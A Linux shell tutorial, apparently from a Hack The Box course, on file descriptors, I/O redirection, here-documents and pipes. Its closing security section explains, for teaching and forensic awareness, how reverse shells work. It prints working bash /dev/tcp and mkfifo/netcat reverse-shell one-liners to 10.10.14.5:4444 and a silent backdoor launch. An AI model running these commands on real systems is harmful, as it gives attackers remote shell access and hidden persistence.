## Key Terms

You'll see these words throughout the lesson.

| Term | Plain meaning |
|:---|:---|
| File descriptor | A number the OS uses to track an open stream |
| stdin (0) | Standard input: where a program reads from |
| stdout (1) | Standard output: normal results |
| stderr (2) | Standard error: error messages, kept separate from results |
| `>` / `>>` | Send output to a file (overwrite / append) |
| `<` | Take input from a file |
| Pipe (`\|`) | Feed one program's output into the next |
| `/dev/null` | A "black hole" that discards anything written to it |

## 1. File Descriptor (FD)

A File Descriptor (FD) is a reference the Linux kernel maintains to identify and manage Input/Output (I/O) operations. Every open file, socket, or I/O resource gets a unique number (FD).

Think of an FD like a coat check ticket:
- The ticket is the File Descriptor
- The coat is the file or resource
- The attendant is the operating system

Without the ticket number, the OS has no way to know which resource to access. On Windows, the equivalent concept is called a file handle.

### Default File Descriptors in Linux

| FD | Name | Stream | Description |
|----|------|--------|-------------|
| `0` | STDIN | Input | Standard Input, input from keyboard / file |
| `1` | STDOUT | Output | Standard Output, a program's normal output |
| `2` | STDERR | Output | Standard Error, error messages only |

```
┌─────────────────────────────────────────┐
│              Linux Process              │
│                                         │
│  [FD 0 - STDIN]  ──►  Program Input    │
│  [FD 1 - STDOUT] ◄──  Normal Output    │
│  [FD 2 - STDERR] ◄──  Error Output     │
└─────────────────────────────────────────┘
```

## 2. STDIN & STDOUT

When we run `cat`, we're feeding standard input (STDIN, FD 0) to the program. After pressing `[ENTER]`, the text comes back to the terminal as standard output (STDOUT, FD 1).

```bash
$ cat
SOME INPUT        # ← STDIN (FD 0) — what you type
SOME INPUT        # ← STDOUT (FD 1) — echoed back
```

## 3. STDOUT & STDERR

The `find` command produces two kinds of output at once:
- STDOUT (FD 1), successfully found results (green)
- STDERR (FD 2), "Permission denied" error messages (red)

To hide errors, we redirect STDERR to `/dev/null`, a "black hole" device that discards anything sent to it.

```bash
# Show both STDOUT and STDERR
$ find /etc/ -name shadow
/etc/shadow
find: '/etc/ssl/private': Permission denied

# Redirect STDERR to /dev/null (suppress errors)
$ find /etc/ -name shadow 2>/dev/null
/etc/shadow
```

> `2>` means "redirect FD 2 (STDERR) to the specified destination".

---

## 4. Redirect STDOUT to a File

We can save STDOUT to a file using `>`. If the file doesn't exist, it's created automatically. If it already exists, it's overwritten without confirmation.

```bash
$ find /etc/ -name shadow 2>/dev/null > results.txt
$ cat results.txt
/etc/shadow
```

```
find command
    │
    ├──── STDERR (FD 2) ──► /dev/null  (discarded)
    │
    └──── STDOUT (FD 1) ──► results.txt  (saved)
```

---

## 5. Redirect STDOUT and STDERR to Separate Files

We can send STDOUT and STDERR to two different files at the same time. This is useful when debugging, since it lets us analyze errors separately from normal output.

```bash
$ find /etc/ -name shadow 2> stderr.txt 1> stdout.txt

$ cat stdout.txt
/etc/shadow

$ cat stderr.txt
find: '/etc/ssl/private': Permission denied
find: '/etc/polkit-1/rules.d': Permission denied
```

```
find command
    │
    ├──── STDERR (FD 2) ──► stderr.txt
    │
    └──── STDOUT (FD 1) ──► stdout.txt
```

## 6. Redirect STDIN

The `<` operator feeds a file's contents as STDIN to a command. Its direction is the opposite of `>`: data flows from the file into the program.

Think of `>` and `<` as directional arrows showing which way the data flows.

```bash
$ cat < stdout.txt
/etc/shadow
```

```
stdout.txt ──► (FD 0 - STDIN) ──► cat ──► terminal output
```

---

## 7. Redirect STDOUT and Append to a File (`>>`)

`>>` (double greater-than) appends output to the end of an existing file without overwriting it. This differs from `>`, which erases the old file content first.

| Operator | Action |
|----------|--------|
| `>` | Overwrite the file |
| `>>` | Append to the end |

```bash
$ find /etc/ -name passwd >> stdout.txt 2>/dev/null
$ cat stdout.txt
/etc/shadow          # ← existing content
/etc/pam.d/passwd    # ← appended
/etc/cron.daily/passwd
/etc/passwd
```

---

## 8. Redirect a STDIN Stream to a File (`<<` / Here-Document)

`<<` (double less-than) streams input straight from the terminal into a file. This is called a here-document. We define an end marker for the input (usually `EOF`, End Of File). All text typed before `EOF` is treated as input.

```bash
$ cat << EOF > stream.txt
> Hack The Box
> EOF

$ cat stream.txt
Hack The Box
```

> `EOF` is just a convention. Any word works as the end marker (e.g. `END`, `STOP`, `DONE`).

## 9. Pipe (`|`)

A pipe (`|`) connects one command's output to the next command's input. This lets us build powerful command chains without saving data to a temporary file.

Pipes can be chained repeatedly. The first command's output becomes the second command's input, whose output becomes the third command's input, and so on.

```bash
# Single pipe: find .conf files and filter for "systemd"
$ find /etc/ -name *.conf 2>/dev/null | grep systemd
/etc/systemd/system.conf
/etc/systemd/timesyncd.conf
/etc/systemd/journald.conf
/etc/systemd/user.conf
/etc/systemd/logind.conf
/etc/systemd/resolved.conf

# Chained pipes: add wc to count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

Pipeline flow:
```
[find /etc/ -name *.conf]
          │  STDOUT
          ▼
    [grep systemd]          ← filters only "systemd" lines
          │  STDOUT
          ▼
        [wc -l]             ← counts the remaining lines
          │
          ▼
          6
```

---

## Redirection Operators: Quick Reference

| Operator | Name | Description |
|----------|------|-------------|
| `>` | Redirect STDOUT | Write output to a file (overwrite) |
| `>>` | Append STDOUT | Append output to a file |
| `<` | Redirect STDIN | Read input from a file |
| `<<` | Here-Document | Stream multi-line input |
| `2>` | Redirect STDERR | Write errors to a file |
| `2>/dev/null` | Suppress STDERR | Discard all error messages |
| `1>` | Explicit STDOUT | Write STDOUT to a file (same as `>`) |
| `2>&1` | Merge STDERR→STDOUT | Combine the error stream into the output stream |
| `\|` | Pipe | Pass STDOUT to the next command's STDIN |

---

## Full Pipeline Example

```bash
# Find all .conf files, filter for "systemd", count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

```
find /etc/ -name *.conf
    │
    ├── STDERR ──► /dev/null      (errors suppressed)
    │
    └── STDOUT ──► grep systemd   (filter results)
                        │
                        └── STDOUT ──► wc -l   (count lines)
                                          │
                                          └──► 6
```

## File Descriptor Flow Summary

```
                  ┌──────────────────┐
  Keyboard ──────►│  FD 0 (STDIN)    │
                  │                  │
                  │     PROCESS      │
                  │                  │
  Terminal ◄──────│  FD 1 (STDOUT)   │
                  │                  │
  Terminal ◄──────│  FD 2 (STDERR)   │
                  └──────────────────┘

Redirection changes where these streams go:
  STDIN  (0) : keyboard → file (<) or here-doc (<<)
  STDOUT (1) : terminal → file (>) or append (>>)
  STDERR (2) : terminal → file (2>) or /dev/null (suppress)
```

## 10. Security Note: Reverse Shells, File Descriptor Hijacking & Evasion

A solid understanding of file descriptors (FDs) and I/O redirection is the core of how reverse shells and stealth techniques work on Linux.

1. Anatomy of a bash reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`):
   - `bash -i`: starts an interactive shell instance.
   - `>& /dev/tcp/IP/PORT`: redirects both STDOUT (FD 1) and STDERR (FD 2) to a TCP network socket on the target.
   - `0>&1`: duplicates STDIN (FD 0) from STDOUT (FD 1), so commands the attacker sends over the socket are read as shell input.
2. Named pipe / FIFO reverse shell (`mkfifo`): uses a special pipe file (`mkfifo /tmp/f`) to build a two-way communication channel when the `/dev/tcp` pseudo-device is disabled in a given Bash build.
3. Evasion and output suppression (`>/dev/null 2>&1`): sends both STDOUT and STDERR to `/dev/null` at once, so a payload or scanning script runs quietly without leaving artifacts in the victim's terminal.
4. Process forensics via `/proc/<PID>/fd/`: a security auditor can inspect the `/proc/<PID>/fd/` folder to see every socket connection, open file, and active communication pipe belonging to a suspicious process.

```bash
# ── REVERSE SHELL ONE-LINERS (FD EXPLOITATION) ───────────────

# 1. Native Bash /dev/tcp reverse shell
$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# 2. Named pipe (FIFO) reverse shell
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# 3. Silent background persistence script
$ nohup ./backdoor.sh >/dev/null 2>&1 &

# ── FORENSIC FD AUDITING ─────────────────────────────────────
# List all active descriptors of process PID 1337
$ ls -la /proc/1337/fd/
# lrwx------ 1 root root 64 0 -> /dev/pts/0
# lrwx------ 1 root root 64 1 -> socket:[28491]
# lrwx------ 1 root root 64 2 -> socket:[28491]
# lrwx------ 1 root root 64 3 -> /etc/shadow
```

## Quick Reference Cheatsheet

```bash
# Suppress errors
command 2>/dev/null

# Save output to file (overwrite)
command > output.txt

# Save output to file (append)
command >> output.txt

# Save STDOUT and STDERR separately
command 1> stdout.txt 2> stderr.txt

# Merge STDERR into STDOUT
command > output.txt 2>&1

# Read file as STDIN
command < input.txt

# Here-document (multi-line stdin)
command << EOF
line one
line two
EOF

# Pipe output to next command
command1 | command2 | command3

# Practical pipeline
find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
```
